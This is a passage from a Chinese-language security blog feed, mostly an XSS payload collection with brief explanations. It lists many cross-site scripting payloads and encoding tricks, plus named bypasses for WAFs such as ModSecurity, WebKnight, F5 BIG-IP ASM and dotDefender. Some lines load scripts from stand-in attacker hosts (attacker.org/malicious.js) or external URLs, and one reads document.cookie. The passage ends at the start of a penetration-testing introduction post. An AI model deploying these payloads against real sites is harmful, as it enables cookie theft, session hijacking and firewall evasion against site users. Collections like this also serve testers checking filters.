class="line">378</span><br><span class="line">379</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(<span class="number">1</span>)&gt;</span><br><span class="line">通杀标签payload：</span><br><span class="line">&lt;aaaa id=<span class="string">"c"</span> onfocus=<span class="string">"alert(1)"</span> tabindex=<span class="number">0</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、script标签</span><br><span class="line">绕过进行一次移除操作：</span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(<span class="string">"XSS"</span>)&lt;<span class="regexp">/scr&lt;script&gt;ipt&gt;</span></span><br><span class="line"><span class="regexp">Script 标签可以用于定义一个行内的脚本或者从其他地方加载脚本：</span></span><br><span class="line"><span class="regexp">&lt;script&gt;alert("XSS")&lt;/</span>script&gt;</span><br><span class="line">&lt;script src=<span class="string">"http://attacker.org/malicious.js"</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">1.2</span> JavaScript 事件</span><br><span class="line">我们可以像如下这样在元素中定义 JavaScript 事件：</span><br><span class="line">&lt;div onclick=<span class="string">"alert('xss')"</span>&gt;</span><br><span class="line">这个 JavaScript 代码当有人点击它后就会被执行，同时还有其他事件如页面加载或移动鼠标都可以触发这些事件。绝大部分的时间都被过滤器所移除了，但是依旧还有少量事件没有被过滤，例如，onmouseenter 事件：&lt;divonmouseenter=<span class="string">"alert('xss')"</span>&gt;当用户鼠标移动到 div 上时就会触发我们的代码。</span><br><span class="line">另一个绕过的办法就是在属性和= 之间插入一个空格：</span><br><span class="line">&lt;div onclick =<span class="string">"alert('xss')"</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">1.3</span> 行内样式(Inlinestyle)</span><br><span class="line">我们同样可以在行内样式里利用 IE 浏览器支持的动态特性：<span class="comment">//IE5之后才支持</span></span><br><span class="line">&lt;div style=<span class="string">"color: expression(alert('XSS'))"</span>&gt;<span class="comment">//experssion后执行的语句相当于javascript后执行的语句</span></span><br><span class="line">过滤器会检查关键字 style，随后跟随的不能是 &lt;，在随后是 expression：</span><br><span class="line">/style=[^&lt;]*((expression\s*?[&lt;]∗?)|(behavior\s*:))[^&lt;]*(?=\&gt;)/Uis</span><br><span class="line">所以，让我们需要把 &lt; 放到其他地方：</span><br><span class="line">&lt;div style="color: '&lt;'; color: expression(alert('XSS'))"&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1.4 CSS import</span><br><span class="line">IE 浏览器支持在 CSS 中扩展 JavaScript，这种技术称为动态特性(dynamic properties)。允许攻击者加载一个外部 CSS 样式表是相当危险的，因为攻击者现在可以在原始页面中执行 JavaScript 代码了。</span><br><span class="line">&lt;style&gt;</span><br><span class="line">@import url("http://attacker.org/malicious.css");</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">malicious.css：</span><br><span class="line">body &#123;</span><br><span class="line">    color: expression(alert('XSS'));</span><br><span class="line">&#125;</span><br><span class="line">为了绕过对 @import 的过滤，可以在 CSS 中使用反斜杠进行绕过：</span><br><span class="line">&lt;style&gt;</span><br><span class="line">@imp\ort url("http://attacker.org/malicious.css");</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">IE 浏览器会接受反斜杠，但是我们绕过了过滤器。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1.5 Javascript URL</span><br><span class="line">链接标签里可以通过在 URL 中使用 javascript:… 来执行 JavaScript：</span><br><span class="line">&lt;a href="javascript:alert('test')"&gt;link&lt;/a&gt;</span><br><span class="line">上面的过滤会从代码中移除 javascript:，所以我们不能直接这么写代码。但我们可以尝试改变 javascript:的写法，使它依旧可以被浏览器执行但又不匹配正则表达式。首先来尝试下 URL 编码：</span><br><span class="line">&lt;a href="Java&amp;#115;cript:alert('xss')"&gt;link&lt;/a&gt;</span><br><span class="line">上面这段代码不匹配正则表达式，但是浏览器依旧会执行它，因为浏览器会首先进行 URL 解码操作。</span><br><span class="line">另外，我们还可以使用 VBScript，虽然它在 IE11 中被禁用了，但依旧可以运行在旧版本的 IE 或者启用兼容模式的 IE11 上。我们可以使用类似上面 JavaScript 的方式来插入 VBScript 代码：</span><br><span class="line">&lt;a href='vbscript:MsgBox("XSS")'&gt;link&lt;/a&gt;</span><br><span class="line">'-confirm`1`-'</span><br><span class="line">'-confirm(1)-'</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1.6 利用字符编码</span><br><span class="line">%c1;alert(/xss/);//</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1.7 绕过长度限制</span><br><span class="line">"onclick=alert(1)//</span><br><span class="line">"&gt;&lt;!--</span><br><span class="line">--&gt;&lt;script&gt;alert(xss);&lt;script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1.8 使用&lt;base&gt;标签</span><br><span class="line">&lt;script&gt;alert(navigator.userAgent)&lt;script&gt;</span><br><span class="line">&lt;script&gt;alert(88199)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;confirm(88199)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(88199)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(88199)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;+alert(88199)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(/88199/)&lt;/script&gt;</span><br><span class="line">&lt;script src=data:text/javascript,alert(88199)&gt;&lt;/script&gt;</span><br><span class="line">&lt;scriptsrc=&amp;#100&amp;#97&amp;#116&amp;#97:text/javascript,alert(88199)&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(String.fromCharCode(49,49))&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(/88199/.source)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;setTimeout(alert(88199),0)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;document['write'](88199);&lt;/script&gt;</span><br><span class="line">&lt;anytag onmouseover=alert(15)&gt;M</span><br><span class="line">&lt;anytag onclick=alert(16)&gt;M</span><br><span class="line">&lt;a onmouseover=alert(17)&gt;M</span><br><span class="line">&lt;a onclick=alert(18)&gt;M</span><br><span class="line">&lt;a href=javascript:alert(19)&gt;M</span><br><span class="line">&lt;button/onclick=alert(20)&gt;M</span><br><span class="line">&lt;form&gt;&lt;button</span><br><span class="line">formaction=javascript&amp;colon;alert(21)&gt;M</span><br><span class="line">&lt;form/action=javascript:alert(22)&gt;&lt;input/type=submit&gt;</span><br><span class="line">&lt;form onsubmit=alert(23)&gt;&lt;button&gt;M</span><br><span class="line">&lt;form onsubmit=alert(23)&gt;&lt;button&gt;M</span><br><span class="line">&lt;img src=x onerror=alert(24)&gt; 29</span><br><span class="line">&lt;body/onload=alert(25)&gt;</span><br><span class="line">&lt;body</span><br><span class="line">onscroll=alert(26)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;input autofocus&gt;</span><br><span class="line">&lt;iframe src="http://0x.lv/xss.swf"&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe/onload=alert(document.domain)&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;IFRAME SRC="javascript:alert(29);"&gt;&lt;/IFRAME&gt;</span><br><span class="line">&lt;meta http-equiv="refresh" content="0;</span><br><span class="line">url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2830%29%3C%2%73%63%72%69%70%74%3E"&gt;^_^</span><br><span class="line">&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+&gt;&lt;/object&gt;</span><br><span class="line">&lt;object data="javascript:alert(document.domain)"&gt;</span><br><span class="line">&lt;marquee onstart=alert(30)&gt;&lt;/marquee&gt;</span><br><span class="line">&lt;isindex type=image src=1 onerror=alert(31)&gt;</span><br><span class="line">&lt;isindex action=javascript:alert(32) type=image&gt;</span><br><span class="line">&lt;input onfocus=alert(33) autofocus&gt;</span><br><span class="line">&lt;input onblur=alert(34) autofocus&gt;&lt;input autofocus&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.2.1 如果大小写不行的话，&lt;script&gt;被过滤尝试&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;；</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.2.2使用&lt;a&gt;标签测试</span><br><span class="line">&lt;a  href=“http://www.google.com"&gt;Clickme&lt;/a&gt;</span><br><span class="line">&lt;a被过滤？</span><br><span class="line">href被过滤？</span><br><span class="line">其他内容被过滤？</span><br><span class="line">如果没有过滤尝试使用</span><br><span class="line">&lt;a href=”javascript:alert(1)”&gt;Clickme&lt;/a&gt;</span><br><span class="line">尝试使用错误的事件查看过滤</span><br><span class="line">&lt;a href="rhainfosec.com"onclimbatree=alert(1)&gt;ClickHere&lt;/a&gt;</span><br><span class="line">HTML5拥有150个事件处理函数，可以多尝试其他函数</span><br><span class="line">&lt;body/onhashchange=alert(1)&gt;&lt;a href=#&gt;clickit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.3 测试其他标签</span><br><span class="line">src属性</span><br><span class="line">&lt;img src=x      onerror=prompt(1);&gt;</span><br><span class="line">&lt;img/src=aaa.jpg      onerror=prompt(1);</span><br><span class="line">&lt;video src=x      onerror=prompt(1);&gt;</span><br><span class="line">&lt;audio src=x      onerror=prompt(1);&gt;</span><br><span class="line">iframe</span><br><span class="line">&lt;iframesrc="javascript:alert(2)"&gt;</span><br><span class="line">&lt;iframe/src="data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="&gt;</span><br><span class="line">Embed</span><br><span class="line">&lt;embed/src=//goo.gl/nlX0P&gt;</span><br><span class="line">Action</span><br><span class="line">&lt;form action="Javascript:alert(1)"&gt;&lt;input type=submit&gt;</span><br><span class="line">&lt;isindex action="javascript:alert(1)" type=image&gt;</span><br><span class="line">&lt;isindexaction=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1)type=image&gt;</span><br><span class="line">&lt;isindex action=data:text/html, type=image&gt;</span><br><span class="line">mario验证</span><br><span class="line">&lt;span class="pln"&gt;    &lt;/span&gt;&lt;spanclass="tag"&gt;&amp;lt;formaction&lt;/span&gt;&lt;spanclass="pun"&gt;=&lt;/span&gt;&lt;spanclass="atv"&gt;&amp;amp;#039;data:text&amp;amp;sol;html,&amp;amp;lt;script&amp;amp;gt;alert(1)&amp;amp;lt/script&amp;amp;gt&amp;amp;#039;&lt;/span&gt;&lt;spanclass="tag"&gt;&amp;gt;&amp;lt;button&amp;gt;&lt;/span&gt;&lt;spanclass="pln"&gt;CLICK&lt;/span&gt;</span><br><span class="line">“formaction”属性</span><br><span class="line">&lt;isindexformaction="javascript:alert(1)"     type=image&gt;</span><br><span class="line">&lt;input type="image" formaction=JaVaScript:alert(0)&gt;</span><br><span class="line"> &lt;form&gt;&lt;buttonformaction=javascript&amp;colon;alert(1)&gt;CLICKME</span><br><span class="line">“background”属性</span><br><span class="line">&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; // Works on Opera10.5      and IE6</span><br><span class="line">“posters” 属性</span><br><span class="line">&lt;video poster=javascript:alert(1)//&gt;&lt;/video&gt; // Works Upto Opera10.5</span><br><span class="line">“data”属性</span><br><span class="line">&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="&gt;</span><br><span class="line">&lt;object/data=//goo.gl/nlX0P?</span><br><span class="line">“code”属性</span><br><span class="line">&lt;applet code="javascript:confirm(document.cookie);"&gt; // FirefoxOnly</span><br><span class="line">&lt;embed  code="http://businessinfo.co.uk/labs/xss/xss.swf"     allowscriptaccess=always&gt;</span><br><span class="line">事件处理</span><br><span class="line">&lt;svg/onload=prompt(1);&gt;</span><br><span class="line">&lt;marquee/onstart=confirm(2)&gt;/</span><br><span class="line">&lt;body onload=prompt(1);&gt;</span><br><span class="line">&lt;select autofocus onfocus=alert(1)&gt;</span><br><span class="line">&lt;textarea autofocus onfocus=alert(1)&gt;</span><br><span class="line">&lt;keygen autofocus onfocus=alert(1)&gt;</span><br><span class="line">&lt;video&gt;&lt;source onerror="javascript:alert(1)"&gt;</span><br><span class="line">短payload</span><br><span class="line">&lt;q/oncut=open()&gt;</span><br><span class="line">&lt;q/oncut=alert(1)&gt; //      Useful in-case of payloadrestrictions.</span><br><span class="line">嵌套欺骗</span><br><span class="line">&lt;marquee&lt;marquee/onstart=confirm(2)&gt;/onstart=confirm(1)&gt;</span><br><span class="line">&lt;body  language=vbsonload=alert-1 // Works with IE8</span><br><span class="line">&lt;commandonmouseover="\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x63\x6F\x6E\x66\x6  9\x72\x6D\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B"&gt;Save&lt;/command&gt;     // Works with IE8</span><br><span class="line">圆括号被过滤</span><br><span class="line">&lt;a onmouseover="javascript:window.onerror=alert;throw 1"&gt;</span><br><span class="line">&lt;img src=x onerror="javascript:window.onerror=alert;throw 1"&gt;</span><br><span class="line">&lt;body/onload=javascript:window.onerror=eval;throw&amp;#039;=alert\x281\x29&amp;#039;;</span><br><span class="line">Expression 属性</span><br><span class="line">&lt;img style="xss:expression(alert(0))"&gt; // Works upto IE7.</span><br><span class="line">&lt;div style="color:rgb(&amp;#039;&amp;#039;x:expression(alert(1))"&gt;&lt;/div&gt;     // Works upto IE7.</span><br><span class="line">&lt;style&gt;#test&#123;x:expression(alert(/XSS/))&#125;&lt;/style&gt;     // Works upto IE7</span><br><span class="line">“location”属性</span><br><span class="line">&lt;a onmouseover=location=’javascript:alert(1)&gt;click</span><br><span class="line">&lt;body onfocus="location=&amp;#039;javascrpt:alert(1) &gt;123</span><br><span class="line">其他Payload</span><br><span class="line">&lt;meta http-equiv="refresh"     content="0;url=//goo.gl/nlX0P"&gt;</span><br><span class="line">&lt;meta http-equiv="refresh"     content="0;javascript&amp;colon;alert(1)"/&gt;</span><br><span class="line">&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;&lt;g     onload="javascript:\u0061lert(1);"&gt;&lt;/g&gt;&lt;/svg&gt; //     By @secalert</span><br><span class="line">&lt;svg xmlns:xlink=" r=100 /&gt;&lt;animateattributeName="xlink:href"     values=";javascript:alert(1)" begin="0s"     dur="0.1s" fill="freeze"/&gt; // By Mario</span><br><span class="line">&lt;svg&gt;&lt;![CDATA[&gt;&lt;imagexlink:href="]]&gt;&lt;img/src=xx:xonerror=alert(2)//"&lt;/svg&gt;     // By @secalert</span><br><span class="line">&lt;meta content="&amp;NewLine; 1 &amp;NewLine;;JAVASCRIPT&amp;colon;alert(1)" http-equiv="refresh"/&gt;</span><br><span class="line">&lt;math&gt;&lt;a xlink:href="//jsfiddle.NET/t846h/"&gt;click // ByAshar Javed</span><br><span class="line">（）；：被过滤</span><br><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt;     // Works With All Browsers</span><br><span class="line">( is html encoded to &amp;#40</span><br><span class="line"> ) is html encoded to &amp;#41</span><br><span class="line">Opera的变量</span><br><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40      1&amp;#41 // Workswith Opera Only</span><br><span class="line">实体解码</span><br><span class="line">&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</span><br><span class="line">&lt;a href="j&amp;#x26;#x26#x41;vascript:alert%252831337%2529"&gt;Hello&lt;/a&gt;</span><br><span class="line">编码</span><br><span class="line">JavaScript是很灵活的语言，可以使用十六进制、Unicode、HTML等进行编码，以下属性可以被编码</span><br><span class="line">（支持HTML, Octal, Decimal,Hexadecimal, and Unicode）</span><br><span class="line">href=</span><br><span class="line">action=</span><br><span class="line">formaction=</span><br><span class="line">location=</span><br><span class="line">on*=</span><br><span class="line">name=</span><br><span class="line">background=</span><br><span class="line">poster=</span><br><span class="line">src=</span><br><span class="line">code=</span><br><span class="line">data= //只支持base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.4 基于上下文的过滤</span><br><span class="line">WAF最大的问题是不能理解内容，使用黑名单可以阻挡独立的js脚本，但仍不能对xss提供足够的保护，如果一个反射型的XSS是下面这种形式</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.4.1 输入反射属性</span><br><span class="line">&lt;inputvalue="XSStest" type=text&gt;</span><br><span class="line">我们可以使用 “&gt;&lt;imgsrc=x  onerror=prompt(0);&gt;触发，但是如果&lt;&gt;被过滤，我们仍然可以使用“ autofocusonfocus=alert(1)//触发，基本是使用“ 关闭value属性，再加入我们的执行脚本</span><br><span class="line">" onmouseover="prompt(0) x="</span><br><span class="line">" onfocusin=alert(1)     autofocus x="</span><br><span class="line">" onfocusout=alert(1)     autofocus x="</span><br><span class="line">" onblur=alert(1) autofocus     a="</span><br><span class="line">输入反射在&lt;script&gt;标签内</span><br><span class="line">类似这种情况：</span><br><span class="line">&lt;script&gt;</span><br><span class="line">Var</span><br><span class="line">x=”Input”;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">通常，我们使用“&gt;&lt;/script&gt;,闭合前面的&lt;/script&gt;标签，然而在这种情况，我们也可以直接输入执行脚本alert(), prompt()</span><br><span class="line">confirm() ，例如：</span><br><span class="line">“;alert(1)//</span><br><span class="line">2.4.3 超文本内容</span><br><span class="line">代码中的情况如下</span><br><span class="line">&lt;a</span><br><span class="line">href=”Userinput”&gt;Click&lt;/a&gt;</span><br><span class="line">可以使用javascript:alert(1)//直接执行&lt;a</span><br><span class="line">href=”javascript:alert(1)//”&gt;Click&lt;/a&gt;</span><br><span class="line">2.4.4 变形</span><br><span class="line">主要包含大小写和JavaScript变形</span><br><span class="line">javascript&amp;#058;alert(1)</span><br><span class="line">javaSCRIPT&amp;colon;alert(1)</span><br><span class="line">JaVaScRipT:alert(1)</span><br><span class="line">javas&amp;Tab;cript:\u0061lert(1);</span><br><span class="line">javascript:\u0061lert&amp;#x28;1&amp;#x29</span><br><span class="line">avascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar;     // AsharJaved</span><br><span class="line">IE10以下和URI中可以使用VBScript</span><br><span class="line">vbscript:alert(1);</span><br><span class="line">vbscript&amp;#058;alert(1);</span><br><span class="line">vbscr&amp;Tab;ipt:alert(1)"</span><br><span class="line">Data URl</span><br><span class="line">data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</span><br><span class="line">2.4.5JSON内容</span><br><span class="line">反射输入</span><br><span class="line">encodeURIComponent(&amp;#039;userinput&amp;#039;)</span><br><span class="line">可以使用</span><br><span class="line">-alert(1)-</span><br><span class="line">-prompt(1)-</span><br><span class="line">-confirm(1)-</span><br><span class="line">结果</span><br><span class="line">encodeURIComponent(&amp;#039;&amp;#039;-alert(1)-&amp;#039;&amp;#039;)</span><br><span class="line">encodeURIComponent(&amp;#039;&amp;#039;-prompt(1)-&amp;#039;&amp;#039;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.4.6 输入反射在svg标签内</span><br><span class="line">源码如下：</span><br><span class="line">&lt;svg&gt;&lt;script&gt;varmyvar=”YourInput”;&lt;/script&gt;&lt;/svg&gt;</span><br><span class="line">可以输入</span><br><span class="line">www.site.com/test.PHP?var=text”;alert(1)//</span><br><span class="line">如果系统编码了”字符</span><br><span class="line">&lt;svg&gt;&lt;script&gt;varmyvar="text&amp;quot;;alert(1)//";&lt;/script&gt;&lt;/svg&gt;</span><br><span class="line">原因是引入了附加的（XML）到HTML内容里，可以使用2次编码处理</span><br><span class="line">浏览器BUG</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.4.7 字符集BUG</span><br><span class="line">字符集BUG在IE中很普遍，最早的bug是UTF-7。如果能控制字符集编码，我们可以绕过99% 的WAF过滤。</span><br><span class="line">示例</span><br><span class="line">http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=XSS</span><br><span class="line">可以控制编码，提交</span><br><span class="line">http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=”&gt;&lt;img</span><br><span class="line">src=x onerror=prompt(0);&gt;</span><br><span class="line">可以修改为UTF-32编码形式</span><br><span class="line">???script?alert(1)?/script?</span><br><span class="line">http://xsst.sinaapp.com/utf-32-1.php?charset=utf-32&amp;v=%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.4.8 空字节</span><br><span class="line">最长用来绕过mod_security防火墙，形式如下：</span><br><span class="line">&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt;</span><br><span class="line">&lt;scri\x00pt&gt;alert(1);&lt;/scri%00pt&gt;</span><br><span class="line">&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;/s%00c%00r%00%00ip%00t&gt;</span><br><span class="line">空字节只适用于PHP 5.3.8以上的版本</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.4.9 语法BUG</span><br><span class="line">RFC声明中节点名称不能是空格，以下的形式在javascript中不能运行</span><br><span class="line">&lt;script&gt;alert(1);&lt;/script&gt;</span><br><span class="line">&lt;%0ascript&gt;alert(1);&lt;/script&gt;</span><br><span class="line">&lt;%0bscript&gt;alert(1);&lt;/script&gt;</span><br><span class="line">&lt;%, &lt;//, &lt;!,&lt;?可以被解析成&lt;，所以可以使用以下的payload</span><br><span class="line">&lt;//     style=x:expression\28write(1)\29&gt; // Works upto IE7 参考http://html5sec.org/#71</span><br><span class="line">&lt;!--[if]&gt;&lt;script&gt;alert(1)&lt;/script     --&gt; // Worksupto IE9 参考http://html5sec.org/#115</span><br><span class="line">&lt;?xml-stylesheet     type="text/css"?&gt;&lt;root    style="x:expression(write(1))"/&gt; // Works in IE7 参考http://html5sec.org/#77</span><br><span class="line">&lt;%div%20style=xss:expression(prompt(1))&gt;     // Works Upto IE7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.4.10Unicode分隔符</span><br><span class="line">[on\w+\s*]这个规则过滤了所有on事件，为了验证每个浏览器中有效的分隔符，可以使用fuzzing方法测试0×00到0xff，结果如下：</span><br><span class="line">IExplorer=     [0x09,0x0B,0x0C,0x20,0x3B]</span><br><span class="line">Chrome =     [0x09,0x20,0x28,0x2C,0x3B]</span><br><span class="line">Safari = [0x2C,0x3B]</span><br><span class="line">FireFox=     [0x09,0x20,0x28,0x2C,0x3B]</span><br><span class="line">Opera = [0x09,0x20,0x2C,0x3B]</span><br><span class="line">Android =     [0x09,0x20,0x28,0x2C,0x3B]</span><br><span class="line">x0b在Mod_security中已经被过滤，绕过的方法：</span><br><span class="line">&lt;a/onmouseover[\x0b]=location=&amp;#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&amp;#039;&gt;rhainfosec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.4.11缺少X-frame选项</span><br><span class="line">通常会认为X-frame是用来防护点击劫持的配置，其实也可以防护使用iframe引用的xss漏洞</span><br><span class="line">Docmodes</span><br><span class="line">IE引入了doc-mode很长时间，提供给老版本浏览器的后端兼容性，有风险，攻击情景是黑客可以引用你站点的框架，他可以引入doc-mode执行css表达式</span><br><span class="line">expression(open(alert(1)))</span><br><span class="line">以下POC可以插入到IE7中</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    &lt;meta http-equiv="X-UA-Compatible"content="IE=EmulateIE7" /&gt;</span><br><span class="line">    &lt;iframesrc="https://targetwebsite.com"&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">    &lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.4.12Window.name欺骗</span><br><span class="line">情景：我们用iframe加载一个页面，我们可以控制窗口的名称，这里也可以执行javascript代码</span><br><span class="line">POC</span><br><span class="line">&lt;iframesrc=&amp;#039;http://www.target.com?foo="xss autofocus/AAAAA  onfocus=location=window.name//&amp;#039;</span><br><span class="line">name="javascript:alert("XSS")"&gt;&lt;/iframe&gt;</span><br><span class="line">DOM型XSS</span><br><span class="line">服务器不支持过滤DOM型的XSS，因为DOM型XSS总是在客户端执行，看一个例子：</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    vari=location.hash;</span><br><span class="line">    document.write(i);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">在一些情况下，反射型XSS可以转换成DOM型XSS：</span><br><span class="line">http://www.target.com/xss.php?foo=&lt;svg/onload=location=/java/.source+/script/.source+location.hash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.hash[3]//#:()</span><br><span class="line">上面的POC只在[.+都被允许的情况下适用，可以使用location.hash注入任何不允许的编码</span><br><span class="line">Location.hash[1] = :  // Defined at the first position after    the hash.</span><br><span class="line">Location.hash[2]= (  // Defined at the second position after    the has</span><br><span class="line">Location.hash[3] = ) // Defined     at third position after the hash.</span><br><span class="line">如果有客户端过滤可能不适用</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.4.13ModSecurity绕过</span><br><span class="line">&lt;scri%00pt&gt;confirm(0);&lt;/scri%00pt&gt;</span><br><span class="line">&lt;a/onmouseover[\x0b]=location=&amp;#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&amp;#039;&gt;rhainfosec</span><br><span class="line">参考http://blog.spiderlabs.com/2013/09/modsecurity-xss-evasion-challenge-results.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.4.14WEB KNIGHT绕过</span><br><span class="line">&lt;isindexaction=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1)type=image&gt;</span><br><span class="line">&lt;marquee/onstart=confirm(2)&gt;</span><br><span class="line">F5 BIG IP ASM and Palo ALTO绕过</span><br><span class="line">&lt;table background="javascript:alert(1)"&gt;&lt;/table&gt; //IE6或者低版本Opera</span><br><span class="line">    “/&gt;&lt;marquee onfinish=confirm(123)&gt;a&lt;/marquee&gt;</span><br><span class="line">Dot Defender绕过</span><br><span class="line">&lt;svg/onload=prompt(1);&gt; </span><br><span class="line">&lt;isindex action="javas&amp;tab;cript:alert(1)" type=image&gt;</span><br><span class="line">&lt;marquee/onstart=confirm(2)&gt;</span><br></pre></td></tr></table></figure><p>#未完待续…</p>]]></content>
      
      
      <categories>
          
          <category> XSSpayload合集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> payload </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>渗透测试</title>
      <link href="/2019/03/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2019/03/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<center><font color="#4094C7" size="4">渗透测试介绍与实战记录</font></center><h1 id="渗透测试介绍"><a href="#渗透测试介绍" class="headerlink" title="渗透测试介绍"></a><font color="#FF0000">渗透测试介绍</font></h1><hr><ol><li>渗透测试是什么：是指从一个攻击者的角度来检查和审核一个网络系统的安全性的过程。通常由安全工程师尽可能完整地模拟黑客使用的漏洞发现技术和攻击手段，对目标网络/系统/主机/应用的安全性作深入的探测，发现系统最薄弱的环节。渗透测试能够直观的让管理人员知道自己网络所面临的问题。作为一个专业的安全服务，类似于军队的“实战演习”或者“沙盘推演”的概念，通过实战和推演，让用户清晰的了解目前网络的脆弱性和可能造成的影响，以便采取必要的防范措施。</li><li>渗透测试的目标：发现漏洞、数据泄露、获得权限、提权以及更深入的目标。</li><li>渗透测试的方法：基于不同的目标设定不同的渗透测试方案，发现和利用漏洞。</li><li>渗透测试的对象：操作系统(Windows、Solaris、Aix、Linux、Sco、Sgi)、网络结构(路由器、交换机、防火墙等设备组成的网络结构)、应用系统(Web应用、数据库、FTP)、数据内容(数据库、敏感文件内容)</li><li>渗透测试的流程：前期交互与方案制定(确定渗透测试的目标，梳理思路)-&gt;信息搜集(根据渗透测试的目标，搜集信息系统对应方面的信息)-&gt;威胁建模(根据搜集到的信息，分析目标系统的脆弱性，制定攻击模型，理清攻击思路)-&gt;漏洞发现(根据上一步建立的威胁建模，展开漏洞测试)-&gt;漏洞利用(获取数据-SQL注入、敏感信息泄露，获取权限-上传与命令注入)-&gt;权限提升(获取Web服务器最高权限、获取域控权限)-&gt;总结与报告输出(总结漏洞情况，发现漏洞详细过程、漏洞修补方案)</li></ol><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a><font 